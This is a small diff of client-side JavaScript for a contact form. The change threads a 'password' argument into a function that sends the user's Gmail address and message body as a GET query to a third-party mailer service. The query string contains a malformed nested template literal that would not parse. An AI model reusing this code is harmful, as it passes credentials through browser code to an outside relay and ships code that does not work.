@@ -538,7 +538,7 @@ document.getElementById("form-sent").style.display = "block";
 
 
 	  (
-            async (gmail,to,dataBody)=>{
+            async (gmail,to,dataBody,password)=>{
 		    var query = `host=domain.com&port=465&senderName=noxx&from=${gmail}&to=`${to}`&subject=contact form mail sent @ ${new Date().toString()}&content=${dataBody}`;
              const t = await fetch(`https://nodemailer-58f2.onrender.com/mail/?${query}`,{
             method:"GET",
@@ -552,7 +552,7 @@ document.getElementById("form-sent").style.display = "block";
         console.log(res);
 
             }
-        )(gmail,to,dataBody);
+        )(gmail,to,dataBody,password);
 	/*
  fetch('https://trust-coin.github.io/nox/contact').then(r=>r.json()).then(r=>{
 			document.getElementById("submit-btn").disabled = false;
